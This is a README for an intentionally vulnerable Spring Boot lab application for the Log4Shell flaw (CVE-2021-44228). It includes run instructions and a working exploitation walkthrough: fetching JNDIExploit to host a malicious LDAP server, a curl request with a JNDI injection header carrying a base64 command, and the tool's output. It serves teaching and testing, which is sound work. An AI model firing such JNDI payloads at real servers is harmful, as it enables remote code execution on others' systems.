# Log4Shell sample vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.

![](./screenshot.png)

## Running the application

Run it:

```bash
docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
```

Build it yourself (you don't need any Java-related tooling):

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 --name vulnerable-app --rm vulnerable-app
```

## Exploitation steps

*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*

**Update (Dec 13th)**: *The JNDIExploit repository has been removed from GitHub (presumably, [not by GitHub](https://twitter.com/_mph4/status/1470343429599211528)). Just append `web.archive.org` in front of the JNDIExploit download URL below to use the version cached by the Wayback Machine.*

* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server

```bash
wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
```

* Then, trigger the exploit using:

```bash
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

* Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:

```
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
[+] Receive ClassRequest: Exploitjkk87OnvOH.class
[+] Response Code: 200
```

* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:

```
$ docker exec vulnerable-app ls /tmp
...
pwned
...
```

## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

## Contributors

[@christophetd](https://twitter.com/christophetd)
[@rayhan0x01](https://twitter.com/rayhan0x01)
